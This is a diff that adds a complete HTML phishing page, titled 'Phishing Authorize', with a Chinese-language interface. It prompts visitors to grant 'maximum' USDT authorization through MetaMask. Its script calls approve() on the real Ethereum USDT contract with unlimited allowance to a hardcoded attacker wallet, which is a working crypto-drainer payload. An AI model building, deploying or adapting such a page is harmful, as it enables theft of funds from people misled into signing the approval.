@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Phishing Authorize</title>
+</head>
+<body>
+  <h2>授權 USDT（Ethereum 主網）</h2>
+  <button onclick="approve()">授權最大金額</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js"></script>
+  <script>
+    const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+    const attackerAddress = '0xDa4FfA490992769B8F54063bf0B9E7a4D3479459';
+
+    const abi = ['function approve(address spender, uint256 amount) public returns (bool)'];
+
+    async function approve() {
+      if (!window.ethereum) return alert('請先安裝 MetaMask');
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      const contract = new ethers.Contract(usdtAddress, abi, signer);
+      const max = ethers.MaxUint256;
+
+      try {
+        const tx = await contract.approve(attackerAddress, max);
+        alert('已送出授權交易，請到 MetaMask 確認');
+        console.log('TX:', tx.hash);
+      } catch (err) {
+        alert('授權失敗：' + err.message);
+      }
+    }
+  </script>
+</body>
+</html>
